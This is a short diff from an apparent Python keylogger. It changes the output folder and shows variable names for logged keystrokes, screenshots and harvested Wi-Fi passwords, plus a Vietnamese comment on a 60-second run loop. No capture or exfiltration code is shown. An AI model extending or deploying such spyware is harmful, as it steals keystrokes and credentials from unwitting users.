@@ -70,7 +70,7 @@ screenshot_information = "screenshot.png"
 keys_information = "key_log.txt"
 wifipass_information = "wifi.txt"
 
-file_path = os.path.dirname(os.path.abspath(__file__)) + "\\"
+file_path = os.path.dirname(os.path.abspath(__file__)) + "Keylogger\\"
 
 # Thời gian chạy
 time_iteration = 60  # Thời gian lặp lại chương trình
